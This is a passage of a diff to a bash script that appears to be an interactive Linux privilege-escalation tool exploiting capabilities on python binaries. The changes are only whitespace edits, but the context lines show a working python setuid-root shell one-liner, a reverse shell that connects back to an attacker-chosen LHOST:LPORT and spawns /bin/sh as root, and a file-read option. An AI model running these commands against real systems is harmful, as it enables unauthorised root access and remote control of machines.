@@ -169,7 +169,9 @@ while true; do
                 select choice in $ShellCap "Go Back"; do
                     case "$choice" in
                         *python*)
+                        
                             echo "Trying with python3"
+                            
                             "$choice" -c 'import os; os.setuid(0); os.system("bash")'
 
                             read -p "Exploit Failed, do you want to try another one ? [y/N] : " answer
@@ -213,6 +215,7 @@ while true; do
                             
                             read -r -p "Set up your listener at $LHOST:$LPORT then press enter"
                             echo "Trying with python3..."
+                            
                             "$choice" -c 'import sys,socket,os,pty;os.setuid(0);s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
 
                             read -p "Exploit Failed, do you want to try another one ? [y/N] : " answer
@@ -223,7 +226,6 @@ while true; do
                                 break 2
                             fi
                             ;;
-
                         "Go Back")
                             break 2
                             ;;
@@ -251,6 +253,7 @@ while true; do
                 select choice in $FileReadCap "Go Back"; do
                     case "$choice" in
                         *python*)
+                        
                             read -p "What file do you want to read ? : " FILE
                             
                             echo "Trying with python3..."
@@ -267,11 +270,9 @@ while true; do
                                 break 2
                             fi
                             ;;
-                    
                         "Go Back")
                             break 2
                             ;;
-                            
                         *)
                             echo "Invalid Choice, Choose From : "
                             printf '%s\n' "$FileReadCap" | nl -w2 -s') '
@@ -280,7 +281,6 @@ while true; do
                 done 
             done
             ;;
-            
         *)
             echo "Invalid Choice, Restart"
             echo " "
